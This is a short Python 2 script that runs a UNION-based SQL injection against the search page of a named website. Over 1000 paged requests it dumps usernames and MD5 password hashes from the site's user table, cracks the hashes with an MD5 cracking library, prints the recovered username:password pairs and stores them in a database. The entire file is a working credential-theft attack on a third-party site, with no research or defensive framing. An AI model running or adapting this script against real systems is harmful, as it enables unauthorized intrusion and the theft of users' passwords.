import urllib2
import urllib
import re

import db
import md5lib

print 'Start to crawl username & password:\n'
page = 30
c = md5lib.Cracker()
for i in range(0,1000) :
    url = 'http://www.jiuye.org/search.php?keyword=%a5%27,UNHEX(HEX(`A`.`title`)))%20AND%201=0%20UNION%20SELECT%20'+\
        'username,password%20FROM%20user%20WHERE%201%20ORDER%20BY%201%20DESC%20LIMIT%20'''+str(page*i)+','+str(page)+'%23'
    content = urllib2.urlopen(url).read()
    pattern = re.compile(r'<a href=".*=(\w+)">(\w+).*<span> </span></a>')
    match = pattern.findall(content)
    info = []
    if( len(match)>0 ):
        for j in range(0,page-1) :
            md5 = match[j][0]
            password = c.crack(md5)
            print match[j][1] +':'+ password+'\n'
            info.append("('"+match[j][1]+"','"+md5+"','"+password+"')")
        db.save(info)
print 'End'
